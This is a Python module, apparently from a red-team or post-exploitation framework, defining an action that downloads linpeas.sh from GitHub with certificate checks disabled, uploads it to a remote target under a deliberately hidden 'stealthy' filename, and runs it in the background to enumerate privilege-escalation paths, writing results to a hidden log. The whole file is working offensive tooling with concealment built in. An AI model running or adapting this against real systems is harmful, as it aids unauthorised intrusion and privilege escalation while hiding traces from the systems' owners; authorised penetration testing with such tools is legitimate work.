import httpx
from pathlib import Path

# External library imports
from loguru import logger

# Local application/library specific imports
from .core.action import BaseAction
from .core.actions.upload.linux import UploadAction
from .core.utils.common import generate_fixed_length_token


class LinPEASAction(BaseAction):
    DESCRIPTION = "Upload and execute linpeas.sh on the target in the background."

    DEFAULT_URL = (
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
    )

    def run(self, local_path: str = None) -> str:
        # If no local file is provided or it doesn't exist, fetch from GitHub
        if not local_path:
            logger.info("🌐 No linpeas.sh path provided — downloading from GitHub...")
            local_path = self._download_linpeas()
        else:
            local_path = Path(local_path)
            if not local_path.exists():
                logger.warning(
                    f"⚠️ File {local_path} not found. Downloading linpeas.sh..."
                )
                local_path = self._download_linpeas()

        if not local_path or not Path(local_path).exists():
            return "❌ Failed to obtain linpeas.sh locally or via download."

        # Generate a stealthy filename
        filename = f".linpeas_{generate_fixed_length_token(6)}.sh"
        remote_path = f"{self._executor.working_directory}/{filename}"

        UploadAction().run(local_path=str(local_path), remote_path=remote_path)

        # Make it executable
        self._executor.remote_execute(f"chmod +x {remote_path}")

        # Execute in background and redirect output
        output_file = f"{self._executor.working_directory}/.linpeas_output.log"
        exec_cmd = f"nohup {remote_path} > {output_file} 2>&1 &"
        self._executor.remote_execute(exec_cmd)

        logger.success("✅ linpeas started in background.")
        logger.info(f"📄 Output will be stored in: {output_file}")
        return f"🔍 linpeas.sh is running in the background.\nCheck {output_file} for results."

    def _download_linpeas(self) -> Path:
        try:
            response = httpx.get(
                self.DEFAULT_URL,
                timeout=15,
                verify=False,
                follow_redirects=True,
            )
            response.raise_for_status()

            temp_path = Path.cwd() / "linpeas.sh"
            temp_path.write_bytes(response.content)
            temp_path.chmod(0o755)

            logger.success(f"✅ linpeas.sh downloaded to {temp_path}")
            return temp_path
        except Exception as e:
            logger.error(f"❌ Failed to download linpeas.sh: {e}")
            return None
